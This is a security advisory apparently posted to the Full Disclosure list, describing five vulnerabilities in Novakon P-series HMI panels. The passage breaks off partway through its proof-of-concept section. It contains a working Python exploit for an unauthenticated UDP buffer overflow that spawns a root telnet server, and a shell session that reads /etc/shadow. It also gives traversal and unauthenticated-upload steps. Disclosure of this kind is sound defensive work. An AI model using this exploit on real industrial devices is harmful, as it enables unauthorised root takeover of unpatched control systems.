---
title: CyberDanube Security Research 20250919-0 | Multiple Vulnerabilities in Novakon P series
url: https://seclists.org/fulldisclosure/2025/Sep/70
source: Full Disclosure
date: 2025-09-26
fetch_date: 2025-10-02T20:45:17.936007
---

# CyberDanube Security Research 20250919-0 | Multiple Vulnerabilities in Novakon P series

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](69)
[By Date](date.html#70)
[![Next](/images/right-icon-16x16.png)](71)

[![Previous](/images/left-icon-16x16.png)](69)
[By Thread](index.html#70)
[![Next](/images/right-icon-16x16.png)](71)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20250919-0 | Multiple Vulnerabilities in Novakon P series

---

*From*: Thomas Weber | CyberDanube via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 23 Sep 2025 12:36:43 +0000

---

```
CyberDanube Security Research 20250919-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities in Novakon HMI Series
              product| Novakon Touch Screen HMI P Series
   vulnerable version| P - V2001.A.c518o2
        fixed version| -
           CVE number| CVE-2025-9962, CVE-2025-9963, CVE-2025-9964,
                     | CVE-2025-9965, CVE-2025-9966
               impact| Critical
             homepage| https://www.novakon.com.tw/
                found| 21.05.2025
                   by| S. Dietz (Office Vienna)
                     | CyberDanube Security Research
                     | Vienna | St. Pölten
                     |
                     | https://www.cyberdanube.com
                     | This work received funding from the Austrian Research
                     | Promotion Agency (FFG) in course of the KIRAS project
                     | TestCat (FO999911248) and was supported by AIT Austrian
                     | Institute of Technology.
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
Founded in 2010, Novakon Co., Ltd., a subsidiary of the domestically listed
industrial PC manufacturer – iBASE Technology (TPEx: 8050), is a dedicated
Panel PC, HMI (Human-Machine Interface) and IIoT (Industrial Internet of
Things) software developer and hardware manufacturer. Our exceptional
customized services provide clients with a wide array of software tailormade
solutions. As testament to the true value of MIT R&D and manufacture, not only
do we offer customized software and hardware ODM services, but we are also
committed to providing the best product functions and services for different
industrial applications. Novakon focuses on long-term R&D investment to reduce
the cost of introducing automation measures in addition to meeting the needs of
various vertical applications.

Source: https://www.novakon.com.tw/en/about

Vulnerable versions
-------------------------------------------------------------------------------
P - V2001.A.c518o2

Vulnerability overview
-------------------------------------------------------------------------------
1) Unauthenticated Buffer Overflow (CVE-2025-9962)
A buffer overflow vulnerability exists in the binary PSeriesbiosinterface,
which allows unauthenticated attacker to gain remote code execution as root
over the network.

2) Directory Traversal via Symlink (CVE-2025-9963)
A directory traversal vulnerability was identified in the file-explorer
functionality of the device. An attacker can use this vulnerability to read and
write system-wide files and configurations as user "root".

3) Root User Weak Authentication (CVE-2025-9964)
The root user does not have a configured password. Allowing attacker to login
with access to a console to login with an empty string.

4) UDP Service Weak Authentication (CVE-2025-9965)
The service listening on 60681/UDP is responsible for copying applications to
the device. As the service does not require authentication, an attacker can
upload and download any application from and to the device.

5) Execution with Unnecessary Privileges (CVE-2025-9966)
The processes running on the device run mostly with elevated privileges, which
increases the attack surface of the device.

6) Missing Protection Mechanisms
Multiple binaries on the device are missing basic protection mechanisms like
stack canaries, pie, and RELRO.

Proof of Concept
-------------------------------------------------------------------------------
1) Unauthenticated Buffer Overflow (CVE-2025-9962)
The service running on 60681/UDP (Pseriesbiosinterface) is vulnerable to a
stack based buffer overflow vulnerability. An unauthenticated attacker can
exploit this issue to gain remote code execution as root. The following python
PoC can be used to start a telnet server on the device.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/env python3
# fitfrost4 <S.Dietz>
from pwn import *

p = remote(args.IP, 60681, typ='udp')

r6_pos = 112
pc_pos = 136
sp_pos = 576
system_call = 0x0002e728

# 0x000ef2ce (0x000ef2cf): add r0, sp, #0x1b4; bx r6;
buf = flat({
    r6_pos: p32(system_call),
    pc_pos: p32(0x000ef2cf),
    sp_pos: b"/usr/sbin/telnetd &\00"
    })

log.info(hexdump(buf))
p.send(buf)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The root cause of this issue is the usage of an unchecked size from
QUdpSocket::pendingDatagramSize() in client::readDatagram(). The following
decomp makes the issue more clear:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
00058868  while (true)
00058868      this->datagram
0005886c      r0_4 = QUdpSocket::hasPendingDatagrams()
0005886c
00058874      if (r0_4 == 0)
00058874          break
00058874
0005883c      this->datagram
00058840      uint16_t* size = QUdpSocket::pendingDatagramSize()
00058848      unimplemented  {vdup.32 d16, r0}
00058854      unimplemented  {vshr.s64 d16, d16, #0x20}
00058858      int16_t* var_10c_1 = &var_fa
0005885c      unimplemented  {vmov r2, r3, d16}
00058864      QUdpSocket::readDatagram(this->datagram, &var_f8, &var_8c, size)

-------------------------------------------------------------------------------
2) Directory Traversal via Symlink (CVE-2025-9963)
An physical attacker can create an ext2 partition on a flash drive and add a
symlink to / in order to abuse the file-explorer feature of the GUI to modify
system-wide configuration files.

      1. Create and upload an application with iFace Designer.
         The app should contain a button to spawn the file-explorer.

      2. Format and create a symlink to "/".

      3. Use the copy/paste functionality to modify the filesystem as root.

-------------------------------------------------------------------------------
3) Root User Weak Authentication (CVE-2025-9964)
An attacker with access to a console can login as root with an empty password.
We abused this issue by spawning a telnetd instance with 1). However, this can
also be exploited by crashing the Pseriesbiosinterface in order to drop to a
login prompt directly on the device.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
am335x-evm login: root
root@am335x-evm:~# cat /etc/shadow
root::16622:0:99999:7:::
daemon:*:16622:0:99999:7:::
bin:*:16622:0:99999:7:::
[...]

-------------------------------------------------------------------------------
4) UDP Service Weak Authentication (CVE-2025-9965)
An attacker can upload and download applications to the device without any kind
of authentication. We exploited this issue with 2) in order to gain inital
foothold onto the device.

      1. Install the iFACE Designer

      2. Upload or download any application over the network.

-----------------------------------------------------------------...